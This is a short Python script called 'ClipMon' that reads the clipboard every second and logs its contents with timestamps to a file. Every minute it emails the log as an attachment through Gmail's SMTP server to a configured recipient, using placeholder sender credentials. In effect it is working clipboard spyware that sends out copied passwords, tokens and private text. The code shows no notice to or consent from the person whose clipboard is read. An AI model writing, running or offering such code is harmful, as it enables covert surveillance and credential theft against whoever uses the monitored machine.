# ClipMon
# A tool which records the copied data of the clipboard.
# Author - WireBits

import sys
import time
import smtplib
import threading
import pyperclip as pc
from email import encoders
from datetime import datetime
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

port = 587
smtp_server = 'smtp.gmail.com'
sender_email = 'Sender EmailID'
password = 'App Password'

recipient_emails = ['Reciever EmailID']

def sendMail():
    subject = 'Clipboard Log'
    body = 'Here is the attachment of the clipboard log.'
    message = MIMEMultipart()
    message['From'] = sender_email
    message['To'] = ', '.join(recipient_emails)
    message['Subject'] = subject
    message.attach(MIMEText(body, 'plain'))
    
    filename = "log.txt"
    try:
        with open(filename, "rb") as attachment:
            part = MIMEBase("application", "octet-stream")
            part.set_payload(attachment.read())
        encoders.encode_base64(part)
        part.add_header(
            "Content-Disposition",
            f"attachment; filename= {filename}",
        )
        message.attach(part)
    except FileNotFoundError:
        print(f"Error: {filename} not found.")
        return
    
    text = message.as_string()
    with smtplib.SMTP(smtp_server, port) as server:
        server.starttls()
        server.login(sender_email, password)
        server.sendmail(sender_email, recipient_emails, text)
        print('Email sent successfully!')

def clipboard_monitor():
    while True:
        current_time = datetime.now()
        clipboard_text = pc.paste()
        timestamp = current_time.strftime("%d-%m-%Y %H:%M:%S")
        if not clipboard_text:
            sys.exit()
        with open("log.txt",'a') as file_log:
            file_log.write(timestamp + ' - ' + clipboard_text + '\n')
        time.sleep(1)

monitor_thread = threading.Thread(target=clipboard_monitor)
monitor_thread.start()

while True:
    time.sleep(60)
    sendMail()